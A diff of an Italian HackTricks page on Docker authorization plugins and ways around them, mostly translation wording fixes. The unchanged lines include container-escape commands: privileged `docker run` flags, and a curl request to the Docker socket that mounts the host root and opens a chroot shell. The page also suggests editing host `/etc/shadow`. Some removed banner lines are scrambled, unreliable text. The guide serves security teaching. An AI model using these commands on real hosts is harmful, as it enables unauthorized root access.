@@ -1,20 +1,16 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 {% endhint %}
 
 
@@ -28,17 +24,17 @@ I plugin di autorizzazione Docker sono **plugin esterni** che puoi utilizzare pe
 
 Quando viene effettuata una **richiesta HTTP** al **demone** Docker tramite la CLI o tramite l'API Engine, il **sottosistema di autenticazione** **trasmette** la richiesta ai **plugin di autenticazione** installati. La richiesta contiene l'utente (chiamante) e il contesto del comando. Il **plugin** è responsabile della decisione di **consentire** o **negare** la richiesta.
 
-I diagrammi di sequenza qui sotto mostrano un flusso di autorizzazione di consentire e negare:
+I diagrammi di sequenza qui sotto mostrano un flusso di autorizzazione di consenso e di negazione:
 
-![Flusso di autorizzazione consentita](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Flusso di autorizzazione negata](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
 Ogni richiesta inviata al plugin **include l'utente autenticato, le intestazioni HTTP e il corpo della richiesta/risposta**. Solo il **nome utente** e il **metodo di autenticazione** utilizzato vengono passati al plugin. È importante notare che **nessuna** credenziale o token dell'utente vengono passati. Infine, **non tutti i corpi di richiesta/risposta vengono inviati** al plugin di autorizzazione. Solo quei corpi di richiesta/risposta in cui il `Content-Type` è `text/*` o `application/json` vengono inviati.
 
 Per i comandi che possono potenzialmente dirottare la connessione HTTP (`HTTP Upgrade`), come `exec`, il plugin di autorizzazione viene chiamato solo per le richieste HTTP iniziali. Una volta che il plugin approva il comando, l'autorizzazione non viene applicata al resto del flusso. In particolare, i dati in streaming non vengono passati ai plugin di autorizzazione. Per i comandi che restituiscono risposte HTTP a chunk, come `logs` ed `events`, solo la richiesta HTTP viene inviata ai plugin di autorizzazione.
 
-Durante l'elaborazione della richiesta/risposta, alcuni flussi di autorizzazione potrebbero aver bisogno di effettuare ulteriori query al demone Docker. Per completare tali flussi, i plugin possono chiamare l'API del demone come un utente normale. Per abilitare queste query aggiuntive, il plugin deve fornire i mezzi affinché un amministratore configuri politiche di autenticazione e sicurezza adeguate.
+Durante l'elaborazione della richiesta/risposta, alcuni flussi di autorizzazione potrebbero aver bisogno di eseguire query aggiuntive al demone Docker. Per completare tali flussi, i plugin possono chiamare l'API del demone in modo simile a un utente normale. Per abilitare queste query aggiuntive, il plugin deve fornire i mezzi per un amministratore per configurare politiche di autenticazione e sicurezza adeguate.
 
 ## Diversi Plugin
 
@@ -54,7 +50,7 @@ Questo è un esempio che consentirà ad Alice e Bob di creare nuovi contenitori:
 
 Nella pagina [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) puoi trovare la relazione tra l'URL richiesto e l'azione. Nella pagina [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puoi trovare la relazione tra il nome dell'azione e l'azione.
 
-## Tutorial semplice per plugin
+## Tutorial Plugin Semplice
 
 Puoi trovare un **plugin facile da capire** con informazioni dettagliate su installazione e debug qui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
@@ -70,7 +66,7 @@ Per eseguire questa enumerazione puoi **utilizzare lo strumento** [**https://git
 
 ## `run --privileged` non consentito
 
-### Privilegi minimi
+### Privilegi Minimi
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
@@ -112,7 +108,7 @@ Nota che forse non puoi montare la cartella `/tmp`, ma puoi montare una **cartel
 
 **Nota che non tutte le directory in una macchina linux supporteranno il bit suid!** Per controllare quali directory supportano il bit suid esegui `mount | grep -v "nosuid"` Ad esempio, di solito `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` non supportano il bit suid.
 
-Nota anche che se puoi **montare `/etc`** o qualsiasi altra cartella **contenente file di configurazione**, puoi modificarli dal container docker come root per **abusarne nell'host** e ottenere privilegi elevati (magari modificando `/etc/shadow`)
+Nota anche che se puoi **montare `/etc`** o qualsiasi altra cartella **contenente file di configurazione**, puoi modificarli dal container docker come root per **abusarne nell'host** e aumentare i privilegi (magari modificando `/etc/shadow`)
 {% endhint %}
 
 ## Endpoint API non controllato
@@ -125,7 +121,7 @@ Puoi controllare l'API docker in [https://docs.docker.com/engine/api/v1.40/#](ht
 
 ### Binds in root
 
-È possibile che quando l'amministratore di sistema ha configurato il firewall docker, abbia **dimenticato qualche parametro importante** dell' [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Binds**".\
+È possibile che quando l'amministratore di sistema ha configurato il firewall docker, abbia **dimenticato qualche parametro importante** dell'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) come "**Binds**".\
 Nell'esempio seguente è possibile abusare di questa misconfigurazione per creare ed eseguire un container che monta la cartella root (/) dell'host:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
@@ -137,12 +133,12 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 {% hint style="warning" %}
-Nota come in questo esempio stiamo usando il **`Binds`** param come una chiave di livello root nel JSON ma nell'API appare sotto la chiave **`HostConfig`**
+Nota come in questo esempio stiamo usando il **`Binds`** param come chiave di livello root nel JSON ma nell'API appare sotto la chiave **`HostConfig`**
 {% endhint %}
 
 ### Binds in HostConfig
 
-Segui le stesse istruzioni come con **Binds in root** eseguendo questa **richiesta** all'API Docker:
+Segui le stesse istruzioni di **Binds in root** eseguendo questa **richiesta** all'API Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
@@ -194,26 +190,17 @@ Ricorda di **riattivare il plugin dopo l'escalation**, o un **riavvio del serviz
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## Riferimenti
-{% hnt stye="acceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>Supporta HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
